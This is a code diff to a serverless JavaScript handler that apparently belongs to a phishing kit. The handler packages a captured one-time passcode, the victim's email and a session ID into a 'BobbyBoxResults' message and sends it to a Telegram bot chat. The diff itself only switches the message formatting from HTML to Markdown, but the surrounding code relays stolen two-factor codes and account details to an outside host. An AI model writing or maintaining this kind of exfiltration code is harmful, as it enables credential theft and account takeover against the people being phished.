@@ -15,13 +15,10 @@ const createTimeoutSignal = (ms) => {
   return controller.signal;
 };
 
-// --- HTML Escaping ---
-const escapeHtml = (text) => {
-  if (text === null || text === undefined) return 'N/A';
-  return String(text)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;');
+// --- Markdown Escaping ---
+const escapeMarkdown = (text) => {
+  if (!text) return text;
+  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
 };
 
 // --- OTP Message Composer ---
@@ -30,9 +27,9 @@ const composeOtpMessage = (data) => {
   const { otp, session } = data;
   const { email, sessionId } = session || {};
 
-  const safeOtp = escapeHtml(otp);
-  const safeEmail = escapeHtml(email || 'N/A');
-  const safeSessionId = escapeHtml(sessionId);
+  const safeOtp = escapeMarkdown(otp);
+  const safeEmail = escapeMarkdown(email || 'N/A');
+  const safeSessionId = escapeMarkdown(sessionId);
 
   const formattedTimestamp = new Date().toLocaleString('en-US', {
     year: 'numeric', month: 'short', day: 'numeric',
@@ -40,17 +37,19 @@ const composeOtpMessage = (data) => {
     timeZone: 'UTC', hour12: true
   }) + ' UTC';
 
-  return `<b>🔑 BobbyBoxResults - OTP Code 🔑</b>
+  return `
+*🔑 BobbyBoxResults - OTP Code 🔑*
 
-<b>VERIFICATION CODE</b>
-🔢 OTP Code: ${safeOtp}
+*VERIFICATION CODE*
+- 🔢 OTP Code: ${safeOtp}
 
-<b>ASSOCIATED SESSION</b>
-📧 Email: ${safeEmail}
-🆔 Session ID: ${safeSessionId}
+*ASSOCIATED SESSION*
+- 📧 Email: ${safeEmail}
+- 🆔 Session ID: ${safeSessionId}
 
-<b>SUBMITTED AT</b>
-🕒 Timestamp: <b>${formattedTimestamp}</b>`;
+*SUBMITTED AT*
+- 🕒 Timestamp: *${formattedTimestamp}*
+`;
 };
 
 // --- Main Handler ---
@@ -97,7 +96,7 @@ exports.handler = async (event) => {
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
+      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
       signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
     });
 
